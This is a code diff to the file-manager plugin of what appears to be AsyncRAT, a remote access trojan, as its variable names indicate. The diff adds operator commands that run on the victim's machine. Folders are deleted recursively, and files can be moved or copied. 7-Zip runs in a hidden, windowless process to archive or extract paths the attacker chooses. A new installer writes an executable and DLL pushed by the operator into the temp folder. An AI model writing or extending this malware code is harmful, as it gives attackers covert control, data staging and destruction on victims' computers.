@@ -1,15 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
-using System.Linq;
 using System.Text;
 using System.Diagnostics;
-using System.Net.Sockets;
-using System.Security.Authentication;
-using System.Net.Security;
-using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 using Plugin.MessagePack;
 
@@ -83,7 +77,7 @@ namespace Plugin.Handler
                     case "deleteFolder":
                         {
                             string fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
-                            if (Directory.Exists(fullPath)) Directory.Delete(fullPath);
+                            if (Directory.Exists(fullPath)) Directory.Delete(fullPath, true);
                             break;
                         }
 
@@ -105,7 +99,10 @@ namespace Plugin.Handler
                                     {
                                         if (filesArray[i].Length > 0)
                                         {
-                                            File.Copy(filesArray[i], Path.Combine(fullPath, Path.GetFileName(filesArray[i])), true);
+                                            if (unpack_msgpack.ForcePathObject("IO").AsString == "copy")
+                                                File.Copy(filesArray[i], Path.Combine(fullPath, Path.GetFileName(filesArray[i])), true);
+                                            else
+                                                File.Move(filesArray[i], Path.Combine(fullPath, Path.GetFileName(filesArray[i])));
                                         }
                                     }
                                     catch (Exception ex)
@@ -129,12 +126,117 @@ namespace Plugin.Handler
                             Directory.Move(unpack_msgpack.ForcePathObject("Folder").AsString, unpack_msgpack.ForcePathObject("NewName").AsString);
                             break; ;
                         }
+
+                    case "zip":
+                        {
+                            if (Packet.ZipPath == null)
+                            {
+                                CheckForSevenZip();
+                            }
+                            if (Packet.ZipPath == null)
+                            {
+                                Error("not installed!");
+                                return;
+                            }
+                            if (unpack_msgpack.ForcePathObject("Zip").AsString == "true")
+                            {
+                                ZipCommandLine(unpack_msgpack.ForcePathObject("Path").AsString, true);
+                            }
+                            else
+                            {
+                                ZipCommandLine(unpack_msgpack.ForcePathObject("Path").AsString, false);
+                            }
+                            break;
+                        }
+
+                    case "installZip":
+                        {
+                            InstallSevenZip(unpack_msgpack);
+                            break;
+                        }
                 }
 
             }
             catch (Exception ex)
             {
                 Debug.WriteLine(ex.Message);
+                Error(ex.Message);
+            }
+        }
+
+        private void ZipCommandLine(string args, bool isZip)
+        {
+            if (isZip)
+            {
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "\"" + Packet.ZipPath + "\"",
+                    Arguments = $"a -r \"{args}.zip\" \"{args}\" -y",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    ErrorDialog = false,
+                });
+            }
+            else
+            {
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "\"" + Packet.ZipPath + "\"",
+                    Arguments = $"x \"{args}\" -o\"{args.Replace(Path.GetFileName(args), "_" + Path.GetFileNameWithoutExtension(args))}\" -y",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    ErrorDialog = false,
+                });
+            }
+        }
+
+        private void CheckForSevenZip()
+        {
+            try
+            {
+                string sevenZip64 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "7-Zip", "7z.exe");
+                string sevenZip32 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "7-Zip", "7z.exe");
+                string asyncratSvenzip = Path.Combine(Path.GetTempPath(), "7-Zip", "7z.exe");
+
+                if (File.Exists(sevenZip64))
+                    Packet.ZipPath = sevenZip64;
+
+                else if (File.Exists(sevenZip32))
+                    Packet.ZipPath = sevenZip32;
+
+                else if (File.Exists(asyncratSvenzip))
+                    Packet.ZipPath = asyncratSvenzip;
+
+                else
+                    Packet.ZipPath = null;
+            }
+            catch (Exception ex)
+            {
+                Error(ex.Message);
+            }
+        }
+
+        private void InstallSevenZip(MsgPack unpack_msgpack)
+        {
+            try
+            {
+                string asyncratSvenzip = Path.Combine(Path.GetTempPath(), "7-Zip");
+                if (!Directory.Exists(asyncratSvenzip))
+                {
+                    Directory.CreateDirectory(asyncratSvenzip);
+                }
+
+                using (FileStream fs = new FileStream(Path.Combine(asyncratSvenzip, "7z.exe"), FileMode.Create))
+                    fs.Write(unpack_msgpack.ForcePathObject("exe").GetAsBytes(), 0, unpack_msgpack.ForcePathObject("exe").GetAsBytes().Length);
+
+                using (FileStream fs = new FileStream(Path.Combine(asyncratSvenzip, "7z.dll"), FileMode.Create))
+                    fs.Write(unpack_msgpack.ForcePathObject("dll").GetAsBytes(), 0, unpack_msgpack.ForcePathObject("dll").GetAsBytes().Length);
+                Error("installation is done!");
+            }
+            catch (Exception ex)
+            {
                 Error(ex.Message);
             }
         }
@@ -257,35 +359,6 @@ namespace Plugin.Handler
                 return;
             }
         }
-
-        //private void ChunkSend(byte[] msg, Socket client, SslStream ssl)
-        //{
-        //    try
-        //    {
-        //        byte[] buffersize = BitConverter.GetBytes(msg.Length);
-        //        client.Poll(-1, SelectMode.SelectWrite);
-        //        ssl.Write(buffersize);
-        //        ssl.Flush();
-
-        //        int chunkSize = 50 * 1024;
-        //        byte[] chunk = new byte[chunkSize];
-        //        using (MemoryStream buffereReader = new MemoryStream(msg))
-        //        {
-        //            BinaryReader binaryReader = new BinaryReader(buffereReader);
-        //            int bytesToRead = (int)buffereReader.Length;
-        //            do
-        //            {
-        //                chunk = binaryReader.ReadBytes(chunkSize);
-        //                bytesToRead -= chunkSize;
-        //                ssl.Write(chunk);
-        //                ssl.Flush();
-        //            } while (bytesToRead > 0);
-
-        //            binaryReader.Dispose();
-        //        }
-        //    }
-        //    catch { return; }
-        //}
 
         public void ReqUpload(string id)
         {
